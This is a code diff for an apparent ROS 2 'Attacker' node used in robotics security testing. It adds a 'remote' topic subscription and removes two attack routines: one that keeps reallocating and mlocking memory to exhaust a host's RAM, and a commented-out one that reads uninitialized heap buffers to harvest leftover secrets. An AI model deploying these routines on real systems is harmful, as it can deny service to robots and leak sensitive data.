@@ -38,43 +38,14 @@ Attacker::Attacker(const rclcpp::NodeOptions & options)
       RCLCPP_INFO(this->get_logger(), "Unable to subscribe to topic[%s]",topic_name.c_str());
     }
 
+    try {
+      sub_arr.push_back(create_subscription<std_msgs::msg::String>("remote", 10, callback));
+    }
+    catch (...) {
+      RCLCPP_INFO(this->get_logger(), "Unable to subscribe to topic[%s]","remote");
+    }
+
   }
-}
-
-void Attacker::steal_mem(size_t max_num_bytes_allocated, size_t start_with){
-    if(num_bytes_allocated_ == 0){
-        num_bytes_allocated_ = start_with;
-        RCLCPP_INFO(get_logger(), "Start with %ld.", num_bytes_allocated_);
-    }
-    if (num_bytes_allocated_ < max_num_bytes_allocated) {
-        size_t memory_to_allocate = std::min(num_bytes_allocated_ + (kBytesAllocatedPerAttack_ << 10),
-            max_num_bytes_allocated);
-        void * new_memory_block = realloc(memory_block_, memory_to_allocate);
-        if (new_memory_block == NULL) {
-          kBytesAllocatedPerAttack_ -= 100; // if failed try with smaller size 
-          RCLCPP_ERROR(get_logger(), "Failed to allocate memory, decreasing bytes per attack: %ld", kBytesAllocatedPerAttack_);
-        } else {
-          memory_block_ = new_memory_block;
-          num_bytes_allocated_ = memory_to_allocate;
-          int result = mlock(memory_block_, num_bytes_allocated_);
-          RCLCPP_INFO(get_logger(), "Locking memory [%ld] bytes.", num_bytes_allocated_);
-          if (0 != result) {
-            RCLCPP_ERROR(get_logger(), "Error while trying to lock memory: %s ", std::strerror(errno));
-          }
-        }
-    }
-    std::flush(std::cout);
-}
-
-void Attacker::steal_sec(){
-    //   // secrect stealing
-    //   size_t start_size = 10;
-    //   for(int i = 0; i < 10; i++){
-    //     char* side_channel = (char*)(malloc((start_size) * sizeof(char)));
-    //     RCLCPP_INFO(this->get_logger(), "Attacker malloc address: [%p] (size: %ld)", side_channel, start_size); 
-    //     RCLCPP_INFO(this->get_logger(), "Attacker heard: [%s]", side_channel); 
-    //     start_size += 10;
-    //   }
 }
 
 
